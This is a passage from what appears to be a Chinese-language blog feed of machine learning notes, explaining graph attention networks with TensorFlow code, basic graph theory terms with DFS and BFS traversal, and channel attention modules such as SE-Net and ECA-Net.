X。</li><li>我没有任何的节点类别的标注，或者什么其他的标注信息，可以使用GCN吗？当然，就如前面讲的，不训练的GCN，也可以用来提取graph embedding，而且效果还不错。</li><li>GCN网络的层数多少比较好？论文的作者做过GCN网络深度的对比研究，在他们的实验中发现，GCN层数不宜多，2-3层的效果就很好了</li></ol>]]></content>
      
      
      <categories>
          
          <category> GNN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GNN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GAT浅入</title>
      <link href="/2023/10/10/AILearning/GNN/GAT%E6%B5%85%E5%85%A5/"/>
      <url>/2023/10/10/AILearning/GNN/GAT%E6%B5%85%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>在之前介绍的<a href="https://zhuanlan.zhihu.com/p/336195862">GraphSAGE</a>[3]文章中，通过融合当前节点的邻居节点来获得这个节点的特征表示，从而将GCN扩展到了归纳学习的领域。在GraphSAGE中，各个邻居节点被等同的看待，然而在实际场景中，不同的邻居节点可能对核心节点起着不同的作用。这一部分要介绍的GAT（Graph Attention Network）[1]就是通过自注意力机制（<a href="https://zhuanlan.zhihu.com/p/48508221">self-attention</a>）[2] 来对邻居节点进行聚合，实现了对不同邻居的权值自适应匹配，从而提高了模型的准确率。GAT在归纳学习和转导学习的任务中均取得了不错的效果。源代码参考：<a href="https://link.zhihu.com/?target=https%3A//github.com/PetarV-/GAT">https://github.com/PetarV-/GAT</a></p><h2 id="1-gat详解">1. GAT详解</h2><p>和很多深度学习方法类似，GAT由若干个功能相同的block组成，这个block叫做Graph Attention Layer，首先我们先介绍Graph Attention Layer的结构。</p><h3 id="11-图注意力层">1.1 图注意力层</h3><p>图注意力层（Graph attention layer）的输入时节点的特征值 <img src="https://www.zhihu.com/equation?tex=%5Cvec%7B%5Cmathbf%7Bh%7D%7D%3D%7B%5Cvec%7Bh%7D_1%2C+%5Cvec%7Bh%7D_2%2C+%5Ccdots%2C+%5Cvec%7Bh%7D_N%7D%2C+%5Cvec%7Bh%7D_i+%5Cin+%5Cmathbb%7BR%7D%5EF" alt="[公式]"> ，其中 <img src="https://www.zhihu.com/equation?tex=N" alt="[公式]"> 是节点的个数， <img src="https://www.zhihu.com/equation?tex=F" alt="[公式]"> 是节点特征的维度。经过一个Graph Attention Layer后输出一个新的特征向量，假设这个特征向量的节点特征的维度为 <img src="https://www.zhihu.com/equation?tex=F'" alt="[公式]"> （可以为任意值），这个特征可以表示为 <img src="https://www.zhihu.com/equation?tex=%5Cvec%7B%5Cmathbf%7Bh'%7D%7D%3D%7B%5Cvec%7Bh'%7D_1%2C+%5Cvec%7Bh'%7D_2%2C+...%2C+%5Cvec%7Bh'%7D_N%7D%2C+%5Cvec%7Bh'%7D_i+%5Cin+%5Cmathbb%7BR%7D%5E%7BF'%7D" alt="[公式]"> ，如图1所示。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241731141.jpeg" alt="img">图1：GAT中的注意力层</p><p>这里使用Self-attention的目的就是提高 <img src="https://www.zhihu.com/equation?tex=%5Cvec%7B%5Cmathbf%7Bh'%7D%7D" alt="[公式]"> 的表达能力。在Graph Attention Layer中，首先使用一个权值矩阵 <img src="https://www.zhihu.com/equation?tex=%5Cmathbf%7BW%7D+%5Cin+%5Cmathbb%7BR%7D%5E%7BF'+%5Ctimes+F%7D" alt="[公式]"> 作用到每个节点，然后对每个节点使用self-attention来计算一个attention系数，这里使用的共享的self-attention机制，表示为 <img src="https://www.zhihu.com/equation?tex=a" alt="[公式]"> ：</p><p><img src="https://www.zhihu.com/equation?tex=e_%7Bij%7D+%3D+a(%5Cmathbf%7BW%7D%5Cvec%7Bh_i%7D%2C+%5Cmathbf%7BW%7D%5Cvec%7Bh_j%7D)+%5Ctag1" alt="[公式]"></p><p><img src="https://www.zhihu.com/equation?tex=+e_%7Bij%7D" alt="[公式]"> 表示节点 <img src="https://www.zhihu.com/equation?tex=j" alt="[公式]"> 对于节点 <img src="https://www.zhihu.com/equation?tex=i" alt="[公式]"> 的重要性。理论上我们可以计算图中任意一个节点到中心节点的权值，GAT中为了简化计算，将节点限制在了中心节点的一跳邻居内，另外节点也将自己作为邻居节点考虑了进去。</p><p><img src="https://www.zhihu.com/equation?tex=a" alt="[公式]"> 的选择有多种方式，论文中作者选择了一个参数为 <img src="https://www.zhihu.com/equation?tex=%5Cvec%7Ba%7D+%5Cin+%5Cmathbb%7BR%7D%5E%7B2F'%7D" alt="[公式]"> 的单层前馈神经网络，然后使用了 <img src="https://www.zhihu.com/equation?tex=%5Ctext%7BLeakyReLU%7D" alt="[公式]"> 做非线性化，因此 <img src="https://www.zhihu.com/equation?tex=e_%7Bij%7D" alt="[公式]"> 可以写做：</p><p><img src="https://www.zhihu.com/equation?tex=+e_%7Bij%7D+%3D+%5Ctext%7BLeakyReLU%7D(%5Cvec%7B%5Cmathbf%7Ba%7D%7D%5ET%5Cleft%5B%5Cmathbf%7BW%7D+%5Cvec%7Bh%7D_i+%7C+%5Cmathbf%7BW%7D+%5Cvec%7Bh%7D_j%5Cright%5D)+%5Ctag2+" alt="[公式]"></p><p><em>最后使用了</em> <img src="https://www.zhihu.com/equation?tex=%5Ctext%7Bsoftmax%7D" alt="[公式]"> <em>对中心节点的邻居节点做了归一化：</em></p><p><img src="https://www.zhihu.com/equation?tex=+%5Calpha_%7Bij%7D+%3D+%5Ctext%7Bsoftmax%7Dj(e_%7Bij%7D)+%3D+%5Cfrac%7B%5Cexp(e_%7Bij%7D)%7D%7B%5Csum_%7Bk%5Cin%5Cmathcal%7BN%7Di%7D%5Cexp(e_%7Bik%7D)%7D+%5Ctag3" alt="[公式]"></p><p>最终通过对输入特征的加权得到输出特征 <img src="https://www.zhihu.com/equation?tex=%5Cvec%7Bh%7D_i'" alt="[公式]"> ：</p><p><img src="https://www.zhihu.com/equation?tex=+%5Cvec%7Bh%7D_i'+%3D+%5Csigma%5Cleft(+%5Csum_%7Bj+%5Cin+%5Cmathcal%7BN%7D_i%7D+%5Calpha_%7Bij%7D+%5Cvec%7Bh%7D_j%5Cright)+%5Ctag4" alt="[公式]"></p><p>在源码中，作者添加了Dropout以及残差结构的超参供结构调整，这一部分的核心代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">attn_head</span>(<span class="params">seq, out_sz, bias_mat, activation, in_drop=<span class="number">0.0</span>, coef_drop=<span class="number">0.0</span>, residual=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">with</span> tf.name_scope(<span class="string">&#x27;my_attn&#x27;</span>):</span><br><span class="line">        <span class="keyword">if</span> in_drop != <span class="number">0.0</span>:</span><br><span class="line">            seq = tf.nn.dropout(seq, <span class="number">1.0</span> - in_drop)</span><br><span class="line">        seq_fts = tf.layers.conv1d(seq, out_sz, <span class="number">1</span>, use_bias=<span class="literal">False</span>)</span><br><span class="line">        <span class="comment"># simplest self-attention possible</span></span><br><span class="line">        f_1 = tf.layers.conv1d(seq_fts, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        f_2 = tf.layers.conv1d(seq_fts, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        logits = f_1 + tf.transpose(f_2, [<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>])</span><br><span class="line">        coefs = tf.nn.softmax(tf.nn.leaky_relu(logits) + bias_mat)</span><br><span class="line">        <span class="keyword">if</span> coef_drop != <span class="number">0.0</span>:</span><br><span class="line">            coefs = tf.nn.dropout(coefs, <span class="number">1.0</span> - coef_drop)</span><br><span class="line">        <span class="keyword">if</span> in_drop != <span class="number">0.0</span>:</span><br><span class="line">            seq_fts = tf.nn.dropout(seq_fts, <span class="number">1.0</span> - in_drop)</span><br><span class="line">        vals = tf.matmul(coefs, seq_fts)</span><br><span class="line">        ret = tf.contrib.layers.bias_add(vals)</span><br><span class="line">        <span class="comment"># residual connection</span></span><br><span class="line">        <span class="keyword">if</span> residual:</span><br><span class="line">            <span class="keyword">if</span> seq.shape[-<span class="number">1</span>] != ret.shape[-<span class="number">1</span>]:</span><br><span class="line">                ret = ret + conv1d(seq, ret.shape[-<span class="number">1</span>], <span class="number">1</span>) <span class="comment"># activation</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                ret = ret + seq</span><br><span class="line">        <span class="keyword">return</span> activation(ret)  <span class="comment"># activation</span></span><br></pre></td></tr></table></figure><p>我们对上面的重点几行代码进行解读。首先是这个函数的三个输入：</p><ul><li><code>seq</code>: 输入节点的特征矩阵，维度为<code>[num_graph, num_node, fea_size]</code>；</li><li><code>out_sz</code>: 输出特征的维度，也就是 <img src="https://www.zhihu.com/equation?tex=%5Cmathbf%7BW%7D%5Cvec%7Bh_i%7D" alt="[公式]"> 的维度；</li><li><code>bias_mat</code>：图经过过变换后的掩码矩阵，维度为<code>[num_node, num_node]</code>。</li></ul><p>第5行是对原始的节点特征<code>seq</code>利用卷积核大小为1的一维卷积得到维度为<code>[num_graph, num_node, out_sz]</code>的特征向量。</p><p>接着第7，8行对得到的<code>seq_fts</code>分别使用两个独立的卷积核大小为1的卷积核进行一维卷积，得到节点本身的投影<code>f_1</code>以及其邻居的投影<code>f_2</code>。这里对应的是公式1中的 <img src="https://www.zhihu.com/equation?tex=a(%5Cmathbf%7BW%7D%5Cvec%7Bh_i%7D%2C+%5Cmathbf%7BW%7D%5Cvec%7Bh_j%7D)" alt="[公式]"> 。</p><p>第9行是使用广播机制将<code>f_2</code>转置后与<code>f_1</code>叠加，得到注意力矩阵 <img src="https://www.zhihu.com/equation?tex=%5Cvec%7B%5Cmathbf%7Ba%7D%7D%5ET%5Cleft%5B%5Cmathbf%7BW%7D+%5Cvec%7Bh%7D_i+%7C+%5Cmathbf%7BW%7D+%5Cvec%7Bh%7D_j%5Cright%5D" alt="[公式]"> 。</p><p>最后通过第10行的<code>softmax</code>归一化便得到了注意力的权重。需要注意的是在计算<code>softmax</code>之前加了一个<code>bias_mat</code>矩阵，那么这个<code>bias_mat</code>是个什么东西呢？它的作用是让非互为邻居的注意力 <img src="https://www.zhihu.com/equation?tex=e_%7Bij%7D" alt="[公式]"> 不要进入softmax计算。</p><p>当进行权值加权时，一个最简单的思想便是使用一个只有0，1的邻接矩阵和得到的矩阵进行单位乘的运算。但是因为softmax有exp指数运算，这种运算方式会有问题。例如一个节点的邻接向量为 <img src="https://www.zhihu.com/equation?tex=%5B1%2C+1%2C+0%5D" alt="[公式]"> ，权值向量为 <img src="https://www.zhihu.com/equation?tex=%5B0.5%2C+1.2%2C+0.1%5D" alt="[公式]"> ，经过mask得到 <img src="https://www.zhihu.com/equation?tex=%5B0.5%2C+1.2%2C+0%5D" alt="[公式]"> ，再送入到softmax归一化，变为 <img src="https://www.zhihu.com/equation?tex=%5Be%5E%7B0.5%7D%2C+e%5E%7B1.2%7D%2C+e%5E0%5D" alt="[公式]"> ，这里需要被mask掉的1.2变成了 <img src="https://www.zhihu.com/equation?tex=e%5E0%3D1" alt="[公式]"> 。这个非邻居节点还是参与到了权值的计算。所以我们需要将非邻居节点的权值变为0，即加上了<code>bias_mat</code>矩阵。</p><p>这个矩阵的生成方式为<code>utils/process.py</code>的<code>adj_to_bias</code>函数，这个函数的解析见下面代码的注释部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">adj_to_bias</span>(<span class="params">adj, sizes, nhood=<span class="number">1</span></span>):</span><br><span class="line">    nb_graphs = adj.shape[<span class="number">0</span>] <span class="comment"># num_graph个图</span></span><br><span class="line">    mt = np.empty(adj.shape) <span class="comment"># 输出矩阵的形状和adj相同</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 图g的转换</span></span><br><span class="line">    <span class="keyword">for</span> g <span class="keyword">in</span> <span class="built_in">range</span>(nb_graphs):</span><br><span class="line">        mt[g] = np.eye(adj.shape[<span class="number">1</span>]) <span class="comment"># 与g形状相同的对角矩阵</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(nhood): <span class="comment"># 通过self-loop构建K阶邻接矩阵，即A^(K),这里K=1</span></span><br><span class="line">            mt[g] = np.matmul(mt[g], (adj[g] + np.eye(adj.shape[<span class="number">1</span>])))</span><br><span class="line">        <span class="comment"># 大于0的置1，小于等于0的保持不变</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(sizes[g]):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(sizes[g]):</span><br><span class="line">                <span class="keyword">if</span> mt[g][i][j] &gt; <span class="number">0.0</span>:</span><br><span class="line">                    mt[g][i][j] = <span class="number">1.0</span></span><br><span class="line">    <span class="comment"># mt中1的位置为0，位置为0的返回很小的负数-1e9</span></span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1e9</span> * (<span class="number">1.0</span> - mt)</span><br></pre></td></tr></table></figure><h3 id="12-多头图注意力层">1.2 多头图注意力层</h3><p>为了提高注意力机制的泛化能力，GAT选择使用了多头注意力层，即使用K组相互独立的1.1中的单头注意力层，然后将它们的结果拼接在一起，如图2所示。</p><p><img src="https://www.zhihu.com/equation?tex=+%5Cmathbf%7Bh%7D'_i+%3D+%7C+%5E+K+_+%7Bk%3D1%7D+%5Csigma%5Cleft(+%5Csum%7Bv_j+%5Cin+%5Ctilde%7B%5Cmathcal%7BN%7D%7D(v_i)%7D+%5Calpha_%7Bij%7D%5E%7B(k)%7D%5Cmathbf%7BW%7D%5E%7Bk%7D+%5Cmathbf%7Bh%7D_j%5Cright)+%5Ctag5" alt="[公式]"></p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241731953.jpeg" alt="img">图2：GAT中的多头注意力层</p><p>其中 <img src="https://www.zhihu.com/equation?tex=%7C" alt="[公式]"> 表示拼接操作， <img src="https://www.zhihu.com/equation?tex=%5Calpha_%7Bij%7D%5E%7B(k)%7D" alt="[公式]"> 表示第 <img src="https://www.zhihu.com/equation?tex=k" alt="[公式]"> 组注意力机制计算出来的权重系数， <img src="https://www.zhihu.com/equation?tex=%5Cmathbf%7BW%7D%5E%7B(k)%7D" alt="[公式]"> 是第 <img src="https://www.zhihu.com/equation?tex=k" alt="[公式]"> 个模块的权重系数。为了减少特征向量的维度，我们也可以使用平均操作代替拼接操作，如式（6）。在图2中，不同颜色的箭头代表了不同的注意力头，从图中我们可以看出 <img src="https://www.zhihu.com/equation?tex=K%3D3" alt="[公式]"> 。为了增加多头注意力层的表达能力，我们可以使用不同形式的注意力机制。</p><p><img src="https://www.zhihu.com/equation?tex=%5Cvec%7Bh%7D_i'+%3D+%5Csigma+%5Cleft(+%5Cfrac1K+%5Csum_%7Bk%3D1%7D%5EK+%5Csum_%7Bj+%5Cin+%5Cmathcal%7BN%7Dj%7D+%5Calpha_%7Bij%7D%5Ek+%5Cmathbf%7BW%7D%5Ek+%5Cvec%7Bh%7D_j+%5Cright)+%5Ctag6" alt="[公式]"></p><p>在作者本人的博客中[4]，它提到了在Attention的权重系数 <img src="https://www.zhihu.com/equation?tex=%5Calpha_%7Bij%7D" alt="[公式]"> 上施加Dropout[5]将大大提升模型的泛化能力，尤其是数据集比较小的时候。这种方式本质上其实就是对邻居节点的随机采样。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">inference</span>(<span class="params">inputs, nb_classes, nb_nodes, training, attn_drop, ffd_drop, bias_mat, hid_units, n_heads, activation=tf.nn.elu, residual=<span class="literal">False</span></span>):</span><br><span class="line">    attns = []</span><br><span class="line">    <span class="comment"># GAT中预设了8层attention head</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n_heads[<span class="number">0</span>]):</span><br><span class="line">        attns.append(layers.attn_head(inputs, bias_mat=bias_mat,</span><br><span class="line">            out_sz=hid_units[<span class="number">0</span>], activation=activation,</span><br><span class="line">            in_drop=ffd_drop, coef_drop=attn_drop, residual=<span class="literal">False</span>))</span><br><span class="line">    h_1 = tf.concat(attns, axis=-<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 隐藏层，hid_units表示每一层attention head中的隐藏单元个数</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(hid_units)):</span><br><span class="line">        h_old = h_1</span><br><span class="line">        attns = []</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n_heads[i]):</span><br><span class="line">            attns.append(layers.attn_head(h_1, bias_mat=bias_mat,</span><br><span class="line">                out_sz=hid_units[i], activation=activation,</span><br><span class="line">                in_drop=ffd_drop, coef_drop=attn_drop, residual=residual))</span><br><span class="line">        h_1 = tf.concat(attns, axis=-<span class="number">1</span>)</span><br><span class="line">    out = []</span><br><span class="line">    <span class="comment"># 输出层</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n_heads[-<span class="number">1</span>]):</span><br><span class="line">        out.append(layers.attn_head(h_1, bias_mat=bias_mat,</span><br><span class="line">            out_sz=nb_classes, activation=<span class="keyword">lambda</span> x: x,</span><br><span class="line">            in_drop=ffd_drop, coef_drop=attn_drop, residual=<span class="literal">False</span>))</span><br><span class="line">    logits = tf.add_n(out) / n_heads[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> logits</span><br></pre></td></tr></table></figure><p>推理模块由3个循环组成，第一个循环是对attention head的聚合，输入维度是<code>[batch_size, num_node, fea_size]</code>，每个注意力头的输出维度为<code>[batch_size, num_node, out_sz]</code>，将所有的节点聚合，得到的输出特征维度为<code>[batch_size, num_node, out_sz * 8]</code>。第二个循环是中间层的更新，层数是<code>len(hid_units)-1</code>，第 <img src="https://www.zhihu.com/equation?tex=i" alt="[公式]"> 层有<code>n_heads[i]</code>个注意力头。最后一个循环是输出层，为了使输出维度是<code>[batch_size, num_node, nb_classes]</code>，因此使用了平均的聚合方式。</p><h2 id="2-gat的属性">2. GAT的属性</h2><p>根据我们对GAT算法的分析，我们可以总结出GAT的下述属性：</p><ul><li><strong>高效</strong>：因为注意力层的参数对于整张图是共享的，因此注意力机制的权值可以并行计算，同样节点的属性值也可以并行计算。同时因为计算中心节点的特征只需要遍历其一阶邻居节点，这也大幅减少了搜索节点需要的时间。</li><li><strong>低存储</strong>：可以使用稀疏矩阵对GAT的图进行存储，因此需要的最大存储空间为 <img src="https://www.zhihu.com/equation?tex=O(V%2BE)" alt="[公式]"> 。同时因为GAT使用了参数共享的方式，也大幅减少了存储计算参数需要占用的存储空间。</li><li><strong>归纳学习</strong>：因为GAT是基于邻居节点的计算方式，因此也是可归纳的（Inductive）。</li><li><strong>全图访问</strong>：GraphSAGE的采样方式是采样固定数量的邻居，而GAT是采样所有的邻居节点，得到的特征更稳定以及更具表征性。</li></ul><h2 id="3-总结">3. 总结</h2><p>这篇文章介绍了一个基于Attention机制的图神经网络，和NLP中的Attention机制类似，GAT的Attention也是非常直观的。同GraphSAGE一样，GAT也是一个基于空域的GNN，而且是可以进行归纳学习的。GAT的一个问题是因为只归纳了一阶邻居，导致GAT的感受野必须依赖非常深的网络才能扩展到很大，为了解决这个问题，作者在源码中也添加了一个残差机制。</p><h2 id="reference">reference</h2><p>[1] Veličković, Petar, et al. “Graph attention networks.” <em>arXiv preprint arXiv:1710.10903</em> (2017).</p><p>[2] Vaswani A, Shazeer N, Parmar N, et al. Attention is all you need [C]//Advances in Neural Information Processing Systems. 2017: 5998-6008.</p><p>[3] Hamilton, Will, Zhitao Ying, and Jure Leskovec. “Inductive representation learning on large graphs.” <em>Advances in neural information processing systems</em>. 2017.</p><p>[4] <a href="https://link.zhihu.com/?target=https%3A//petar-v.com/GAT/">https://petar-v.com/GAT/</a></p><p>[5] Srivastava, Nitish, et al. “Dropout: a simple way to prevent neural networks from overfitting.” <em>The journal of machine learning research</em> 15.1 (2014): 1929-1958.</p>]]></content>
      
      
      <categories>
          
          <category> GNN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GNN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图的基本概念</title>
      <link href="/2023/10/10/AILearning/GNN/%E5%9B%BE%E7%9A%84%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5/"/>
      <url>/2023/10/10/AILearning/GNN/%E5%9B%BE%E7%9A%84%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<h2 id="一-图的逻辑结构">一、图的逻辑结构</h2><h3 id="一图的定义">（一）图的定义</h3><p>图是由顶点的有穷非空集合和顶点之间边的集合组成，通常表示为：G=(V，E)</p><p>ps：G表示一个图，V是图G中顶点的集合，E是图G中顶点之间边的集合。</p><h3 id="二基本概念">（二）基本概念</h3><p>1.无向边：顶点vi和vj之间的边没有方向，表示为(vi,vj)。</p><p>2.无向图：顶点vi和vj之间的边没有方向，表示为(vi,vj)。</p><p>3.有向边：从顶点vi到vj的边有方向，表示为&lt;vi,vj&gt;。</p><p>4.有向图：图的任意两个顶点之间的边都是有向边。</p><p>5.简单图：若不存在顶点到其自身的边，且同一条边不重复出现。</p><p>6.邻接、依附：无向图中，对于任意两个顶点vi和顶点vj，若存在边(vi，vj)，则称顶点vi和</p><p>顶点vj互为邻接点，同时称边(vi，vj)依附于顶点vi和顶点vj。</p><p>7.无向完全图：在无向图中，如果任意两个顶点之间都存在边，则称该图为无向完全图。</p><p>8.有向完全图：在有向图中，如果任意两个顶点之间都存在方向相反的两条弧，则称该图</p><p>为有向完全图。</p><h3 id="三基本术语">（三）基本术语</h3><p>1.稀疏图：称边数很少的图为稀疏图；</p><p>2.稠密图：称边数很多的图为稠密图。</p><p>3.顶点的度：在无向图中，顶点v的度是指依附于该顶点的边数，通常记为TD (v)。</p><p>4.顶点的入度：在有向图中，顶点v的入度是指以该顶点为弧头的弧的数目，记为ID (v)；</p><p>5.顶点的出度：在有向图中，顶点v的出度是指以该顶点为弧尾的弧的数目，记为OD (v)。</p><p>6.权：是指对边赋予的有意义的数值量。</p><p>7.网：边上带权的图，也称网图。</p><p>8.路径：在无向图G=(V, E)中，从顶点vp到顶点vq之间的路径是一个顶点序列(vp=vi0,vi1,vi2, …,vim=vq)，其中，(vij-1,vij)∈E（1≤j≤m）。若G是有向图，则路径也是有方向的，顶点序列</p><p>满足&lt;vij-1,vij&gt;∈E。</p><p>9.路径长度：对于非带权图是路径上边的个数；对于带权图是路径上各边的权之和</p><p>10.回路（环）：第一个顶点和最后一个顶点相同的路径。</p><p>11.简单路径：序列中顶点不重复出现的路径。</p><p>12.简单回路（简单环）：除了第一个顶点和最后一个顶点外，其余顶点不重复出现的回</p><p>路。</p><p>13.子图：若图G=（V，E），G’=（V’，E’），如果V’ÍV 且E’ Í E ，则称图G’是G的子图。</p><p>14.连通图：在无向图中，如果从一个顶点vi到另一个顶点vj(i≠j)有路径，则称顶点vi和vj是</p><p>连通的。如果图中任意两个顶点都是连通的，则称该图是连通图。</p><p>15.连通分量：非连通图的极大连通子图称为连通分量。</p><p>16.强连通图：在有向图中，对图中任意一对顶点vi和vj (i≠j)，若从顶点vi到顶点vj和从顶点</p><p>vj到顶点vi均有路径，则称该有向图是强连通图。</p><p>17.强连通分量：非强连通图的极大强连通子图。</p><p>18.生成树：n个顶点的连通图G的生成树是包含G中全部顶点的一个极小连通子图。</p><p>19.生成森林：在非连通图中，由每个连通分量都可以得到一棵生成树，这些连通分量的生成树就组成了一个非连通图的生成森林。</p><h3 id="四图的遍历操作">（四）图的遍历操作</h3><h4 id="深度优先遍历-dfs">深度优先遍历 （DFS）</h4><p>基本思想：</p><p>⑴ 访问顶点v；</p><p>⑵ 从v的未被访问的邻接点中选取一个顶点w，从w出发进行深度优先遍历；</p><p>⑶ 重复上述两步，直至图中所有和v有路径相通的顶点都被访问到。</p><h4 id="广度优先遍历-bfs">广度优先遍历 （BFS）</h4><p>基本思想：</p><p>⑴ 访问顶点v；</p><p>⑵ 依次访问v的各个未被访问的邻接点v1, v2, …, vk；</p><p>⑶ 分别从v1，v2，…，vk出发依次访问它们未被访问的邻接点，并使“先被访问顶点的邻接点”先于“后被访问顶点的邻接点”被访问。直至图中所有与顶点v有路径相通的顶点都被访问到。</p>]]></content>
      
      
      <categories>
          
          <category> GNN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GNN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNN中的注意力</title>
      <link href="/2022/12/18/AILearning/CNN/CNN-%E6%B3%A8%E6%84%8F%E5%8A%9B/"/>
      <url>/2022/12/18/AILearning/CNN/CNN-%E6%B3%A8%E6%84%8F%E5%8A%9B/</url>
      
        <content type="html"><![CDATA[<p>注意力机制最初在 2014年作为 RNN（Recurrent Neural Network）中编码器-解码器框架的一部分来编码长的输入语句，后续被广泛运用在RNN中。</p><h2 id="1单路注意力">1.单路注意力</h2><h4 id="se-netsqueeze-and-excitation">SE-NET（Squeeze and Excitation）</h4><blockquote><p>HU J，SHEN L，SUN G.Squeeze-and-excitation networks[J].</p></blockquote><p>2018年 ，CVPR（计算机视觉和模式识别）收录的论文中提出了 SE-Net（挤压和励磁网络）是 Momenta 胡杰团队 （WMW）提出的新的网络结构，该团队利用 SE网络获得 了ImageNet 2017年竞赛图像分类任务的冠军，在ImageNet数据集上将 top-5错误降低到 2.251%，对比于以往的最 好成绩 2.991%有了较大的提升。</p><p>SE-Net中的关键结构SE-Netblock利用了注意力机制的思想，显式地建模特征图之间的相互依赖关系，并通过学习的方式来自适应地获取到每张特征图的重要性，然后依照这个重要程度去对原数据进行更新。SE-Net通过这种方式提升有用的特征重要程度同时降低无用特征的重要性，并以不同通道的重要性为指导，将计算资源合理地投入不同通道当中。</p><p>通俗地来说SENet的核心思想在于通过网络根据损失函数值loss去学习特征权重，使得对于任务更为效果明显的特征图权重变大，无效果或效果不明显的特征图权重变小的方式来训练模型从而达到更好的结果。SE-Netblock并不是一个完整的网络结构，而是一个即插即用的轻量级模块，通过将此模块嵌入网络之中，可以在小幅度提升参数量的代价下更加合理地分配神经网络的计算资源，大幅提升网络性能。</p><p>在SE-Netblock中，<mark>每张特征图通过全局平均池化操作进行挤压</mark>，<mark>将每一张特征图挤压成一个实数</mark>（见公式（1）），这个实数具有特征图上的全局信息，<mark>每张特征图的挤压结果组合成一个向量作为每组特征图的权重，其中H和W分别为特征图的高和宽，</mark><strong>u为卷积后的结果，z为对应特征图的全局注意力信息，将此向量通过全连接层与激活函数</strong>（见公式（2）），训练结果用来放大对于识别任务更加重要特征图的权重，缩小不重要特征图的权重，其中σ为relu激活函数，δ代表sigmoid激活函数，W1与W2代表两个不同的全连接操作。得到的向量s代表每张特征图的重要性程度。向量s通过公式（3）激励原特征图，指导特征图不断向着有利于识别任务的方向更新，挤压激励操作结构如图2所示。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241651509.png" alt="image-20220711094328585" style="zoom:80%;" /><p>[1].张宸嘉, 朱磊与俞璐, 卷积神经网络中的注意力机制综述. 计算机工程与应用, 2021. 57(20): 第64-72页.</p><h4 id="eca-netefficient-channel-attention">ECA-Net（Efficient Channel Attention）</h4><p>2020年，CVPR收录的论文中提出了ECA-Net[14]（EfficientChannelAttentionNetwork）来对SE-Net进行改进，它实现了对SE-Net block的改进，提出了<mark>一种不降维的局部跨信道交互策略（ECAblock）和自适应选择一维卷积核大小的方法</mark>，通过一维卷积层汇总跨信道信息的方法获取更加精确的注意力信息。ECA block的思想建立在作者认为<mark>跨通道的信息交互是很有必要的</mark>，而SE-Net block只注重通道内部信息的综合，没有考虑到相邻信道信息的重要性。ECA block的结构如图3所示。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241651503.png" alt="image-20220711095517412" style="zoom:80%;" 